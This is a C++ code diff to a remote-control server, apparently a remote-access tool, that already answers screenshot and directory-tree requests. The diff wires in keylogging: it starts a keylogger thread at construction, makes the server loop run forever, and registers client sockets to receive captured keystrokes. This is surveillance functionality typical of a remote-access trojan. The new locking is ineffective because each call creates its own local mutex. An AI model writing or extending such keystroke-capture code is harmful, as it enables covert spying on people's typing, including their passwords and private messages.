@@ -13,15 +13,20 @@
 #include <string>
 #include "../Utils/InUtils.h"
 #include "helper.h"
+#include "function_unix/Keylog.h"
+#include <mutex>
 
 Server::~Server()
 {
     std::cout << "closed" << "\n";
+    stopKeylogHelper();
     close(this->listener);
     close(this->disfd);
+    this->keylogThread.join();
 }
 Server::Server()
 {
+    this->keylogThread = std::thread(startKeylogHelper);
     char port[] = SERVER_PORT;
     int status;
     int yes = 1;
@@ -129,7 +134,7 @@ void Server::start()
     sockaddr_storage remote_address;
     socklen_t addrlen;
     int cnt = 0;
-    while (cnt++ < 5)
+    while (1)
     {
         int poll_count = poll(this->pfds.data(), pfds.size(), -1);
         if (poll_count == -1)
@@ -143,6 +148,7 @@ void Server::start()
             // get one ready to read
             if (pfd.revents & POLLIN)
             {
+                std::cout << "POLLIN " << pfd.fd << std::endl;
                 // listener ready to read - new connection
                 if (pfd.fd == this->listener)
                 {
@@ -206,9 +212,9 @@ void Server::start()
                         else if (buffer.type() == SCREENSHOT_REQUEST)
                             res = this->screenshot();
                         else if (buffer.type() == START_KEYLOG_REQUEST)
-                            res = this->startKeylog();
+                            res = this->startKeylog(pfd.fd);
                         else if (buffer.type() == STOP_KEYLOG_REQUEST)
-                            res = this->stopKeylog();
+                            res = this->stopKeylog(pfd.fd);
                         else if (buffer.type() == DIR_TREE_REQUEST)
                             res = this->dirTree((char *)buffer.data());
                         else 
@@ -291,13 +297,28 @@ Response Server::screenshot()
     return Response(CMD_RESPONSE_PNG, errCode, buffer.size(), buffer.data());
 }
 
-Response Server::startKeylog()
+Response Server::startKeylog(int sockfd)
 {
-    return Response();
+    std::mutex m;
+    std::lock_guard l(m);
+    std::cout << "Start keylog" << std::endl;
+    keylogfds.push_back(sockfd);
+    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL);
 }
-Response Server::stopKeylog()
+Response Server::stopKeylog(int sockfd)
 {
-    return Response();
+    std::mutex m;
+    std::lock_guard l(m);
+    for (int i = 0; i < keylogfds.size(); ++i)
+    {
+        if (keylogfds[i] == sockfd)
+        {
+            keylogfds[i] = keylogfds.back();
+            keylogfds.pop_back();
+            break;
+        }
+    }
+    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL);
 }
 
 Response Server::dirTree(const char *pathName)
